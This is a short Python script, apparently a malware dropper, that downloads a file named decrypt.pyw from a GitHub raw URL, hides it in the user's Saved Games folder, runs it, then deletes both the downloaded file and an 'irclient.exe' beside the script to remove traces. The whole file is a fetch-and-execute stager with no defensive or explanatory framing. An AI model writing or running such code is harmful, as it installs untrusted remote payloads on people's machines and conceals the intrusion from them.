#!/usr/bin/env python3

import os 
import time
import subprocess
from urllib.request import urlopen 

def download(URL , save_path):
	try:
		a = urlopen(URL)
	except:
		pass
	with open(save_path,"wb") as f:
		f.write(a.read())
def main():
	url = "https://github.com/Samplayswthpython/hello/raw/main/decrypt.pyw"
	save_path = f"{os.path.expanduser('~')}\\Saved Games\\decrypt.pyw"
	download(url , save_path)
	subprocess.call(["python",save_path])
	os.remove(save_path)

if __name__ == "__main__":
	main()
	a = f"{os.path.dirname(__file__)}\\irclient.exe"
	os.remove(a)
